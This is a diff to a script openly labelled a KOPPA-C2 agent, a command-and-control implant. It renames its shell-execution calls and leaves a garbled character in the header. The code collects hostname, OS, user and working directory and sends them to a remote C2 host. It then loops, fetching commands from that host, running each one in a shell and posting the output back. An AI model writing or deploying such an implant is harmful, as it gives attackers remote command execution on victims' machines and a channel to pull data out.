@@ -1,14 +1,14 @@
-# koppa-c2-client v2.0 — KOPPA-C2 agent
+# koppa-c2-client v2.0 â€” KOPPA-C2 agent
 # Usage: koppa run koppa-c2-client <c2_host> <c2_port> [agent_id]
 
 import http, encode, hash, sys, log
 
 fn register(c2_url, agent_id) {
     let info = {
-        "hostname": sys.exec("hostname").trim(),
-        "os":       sys.exec("uname -s").trim(),
-        "user":     sys.exec("whoami").trim(),
-        "pwd":      sys.exec("pwd").trim()
+        "hostname": os.shell("hostname").trim(),
+        "os":       os.shell("uname -s").trim(),
+        "user":     os.shell("whoami").trim(),
+        "pwd":      os.shell("pwd").trim()
     }
     http.post("{c2_url}/register/{agent_id}", info)
     log.success("[+] Registered as {agent_id}")
@@ -44,14 +44,14 @@ fn connect(c2_host, c2_port, agent_id, interval) {
                 let cmd     = task.cmd
                 let task_id = task.task_id
                 log.info("[task:{task_id}] {cmd}")
-                let output = sys.exec(cmd)
+                let output = os.shell(cmd)
                 send_result(c2_url, agent_id, task_id, output)
                 log.success("[+] Result sent ({output.len}b)")
             }
         } catch(err) {
             log.warn("[!] Beacon error: {err}")
         }
-        sys.sleep(interval * 1000)
+        os.sleep(interval * 1000)
     }
 }
 
@@ -67,8 +67,9 @@ fn main() {
     }
 
     if not agent_id {
-        agent_id = hash.md5(sys.exec("hostname").trim()).substring(0, 8)
+        agent_id = hash.md5(os.shell("hostname").trim()).substring(0, 8)
     }
 
     connect(c2_host, c2_port, agent_id, interval)
 }
+
